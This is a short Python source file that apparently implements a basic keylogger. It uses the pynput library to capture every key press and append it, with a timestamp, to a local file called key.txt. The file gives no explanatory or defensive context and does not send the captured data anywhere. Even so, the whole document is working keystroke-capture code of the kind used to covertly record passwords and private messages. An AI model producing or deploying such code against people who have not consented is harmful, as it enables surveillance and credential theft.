from pynput import keyboard
import datetime

def key_press (key):
    
    file_key = open("key.txt",'a+',encoding ='utf-8')
    file_key.write(str(key))    
    file_key.write(str(' | Data: {} ;\n'.format(datetime.datetime.now(tz=None))))
    file_key.close()   

with keyboard.Listener(on_press = key_press) as listen:
    listen.join()